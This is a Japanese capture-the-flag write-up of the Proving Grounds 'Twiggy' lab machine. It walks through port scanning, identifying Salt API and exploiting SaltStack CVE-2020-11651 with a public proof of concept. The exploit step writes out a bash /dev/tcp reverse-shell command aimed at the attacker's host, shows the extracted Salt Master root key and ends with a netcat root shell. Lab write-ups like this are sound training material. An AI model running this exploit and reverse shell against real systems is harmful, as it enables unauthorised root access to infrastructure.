+++
title = "Proving Grounds Practice - Twiggy Writeup"
date = "2026-11-23"
description = "SaltStackの認証バイパス脆弱性（CVE-2020-11651）を悪用し、Masterのroot keyを取得してリモートコマンド実行を行い、root権限を取得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[SaltStack]", "[CVE-2020-11651 - Authentication Bypass]", "[Remote Code Execution]", "[Easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field      | Details        |
| ---------- | -------------- |
| Machine    | Twiggy         |
| OS         | Linux          |
| IP Address | 192.168.160.62 |
| Difficulty | Easy           |

---

## Reconnaissance

### Nmap Scan

まず、Nmapを使用して全TCPポートのスキャンとサービスのバージョン確認を行う。

```bash
nmap -sV -sC -p- 192.168.160.62
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-23 20:03 +0900
Nmap scan report for 192.168.160.62
Host is up (0.093s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 267.17 seconds
```

スキャン結果から、以下のポートが開放されていることを確認した。

| Port     | Service | Version / Information |
| -------- | ------- | --------------------- |
| 22/tcp   | SSH     | OpenSSH 7.4           |
| 53/tcp   | DNS     | NLnet Labs NSD        |
| 80/tcp   | HTTP    | nginx 1.16.1          |
| 4505/tcp | ZMTP    | ZeroMQ ZMTP 2.0       |
| 4506/tcp | ZMTP    | ZeroMQ ZMTP 2.0       |
| 8000/tcp | HTTP    | nginx 1.16.1          |

特に注目したのは、4505/tcpと4506/tcpである。

これらはSaltStackがMasterとMinion間の通信に使用するポートとして知られている。

また、8000/tcpでもHTTPサービスが動作しているため、こちらを調査する。

---

## Enumeration

### HTTP Enumeration

ブラウザから以下のURLにアクセスする。

```text
http://192.168.160.62:8000/
```

開発者ツールなどを使用してHTTPレスポンスのHeadersを確認したところ、以下のヘッダーが存在した。

```text
X-Upstream: salt-api/3000-1
```

この情報から、ポート8000でSalt APIが稼働していることが判明した。

SaltStackは、構成管理やリモートコマンド実行などに使用されるシステムである。

さらに、4505/tcpと4506/tcpが開放されていることから、ターゲット上でSaltStackが動作している可能性が高い。

### Vulnerability Research

SaltStackについて調査したところ、Masterに対する認証バイパスの脆弱性であるCVE-2020-11651が存在することが分かった。

この脆弱性は、SaltStackのMasterに対する認証処理の不備を悪用し、認証なしで機密情報へアクセスできる問題である。

また、関連するCVE-2020-11652では、SaltStackのファイルサーバーにおけるパストラバーサルなどの問題が存在する。

今回利用するExploitは以下のGitHubリポジトリから取得した。

[https://github.com/hardsoftsecurity/CVE-2020-11651-PoC](https://github.com/hardsoftsecurity/CVE-2020-11651-PoC)

---

## Initial Access

### SaltStack - CVE-2020-11651

GitHubからExploitを取得する。

```bash
git clone https://github.com/hardsoftsecurity/CVE-2020-11651-PoC.git
```

取得したディレクトリに移動する。

```bash
cd CVE-2020-11651-PoC
```

Pythonの仮想環境を有効化し、必要なライブラリを準備する。

今回の環境では、Exploitを実行した際にSaltのバージョン情報が取得できることを確認した。

リバースシェルを取得するため、Kali側のIPアドレスと実行するコマンドを指定してExploitを実行する。

攻撃者側のIPアドレスは `192.168.45.158` を使用した。

```bash
python3 poc.py --master 192.168.160.62 --exec "bash -i >& /dev/tcp/192.168.45.158/80 0>&1"
```

実行結果は以下の通り。

```text
/home/kali/offsec/poc.py:95: SyntaxWarning: 'return' in a 'finally' block
  return root_key

[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.

[+] Salt version: 3008.5
[ ] This version of salt is vulnerable! Check results below
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attempting to execute bash -i >& /dev/tcp/192.168.45.158/80 0>&1 on 192.168.160.62
[+] Successfully scheduled job: 20261123122859250465
```

実行結果から、以下のことが確認できた。

- Saltのバージョンは3008.5。
- CVE-2020-11651に対して脆弱であることを確認。
- Salt Masterのroot keyを取得。
- 指定したコマンドの実行ジョブの登録に成功。

特に重要なのは、`root key obtained` と表示されている点である。

この脆弱性を利用してSalt Masterのroot keyを取得できたため、認証を回避して任意のコマンドを実行できる状態になった。

### Reverse Shell

攻撃者側で80番ポートのリスナーを起動する。

```bash
nc -lvnp 80
```

Exploitから登録されたジョブが実行されると、ターゲットからリバースシェルの接続が返ってくる。

```text
listening on [any] 80 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.160.62] 38190

bash: no job control in this shell
[root@twiggy root]#
```

プロンプトが以下のようになっていることから、root権限のシェルを取得できた。

```text
[root@twiggy root]#
```

以上でroot権限の取得に成功した。

---

## Summary

Twiggyでは、NmapによるポートスキャンからSaltStackで使用される4505/tcpおよび4506/tcpを発見した。

さらに、8000/tcpのHTTPレスポンスヘッダーから `X-Upstream: salt-api/3000-1` を確認し、Salt APIが稼働していることを特定した。

その後、SaltStackの認証バイパス脆弱性であるCVE-2020-11651を利用した。

Exploitを実行するとSaltのバージョン3008.5が検出され、Masterのroot keyを取得することに成功した。

取得した権限を利用して任意のコマンドを実行し、リバースシェルを通じてroot権限を取得した。

**攻撃の流れ**

1. Nmapによる全TCPポートスキャン
2. 4505/tcp、4506/tcpからSaltStackの存在を推測
3. 8000/tcpのHTTPヘッダーからSalt APIを特定
4. CVE-2020-11651の脆弱性を発見
5. Exploitを使用してSalt Masterのroot keyを取得
6. 任意コマンド実行をスケジュール
7. Netcatでリバースシェルを受信
8. root権限を取得

**Initial Access:** SaltStack - CVE-2020-11651 (Authentication Bypass)

**Privilege Escalation:** Salt Master root keyを利用したリモートコマンド実行

**Final Access:** root
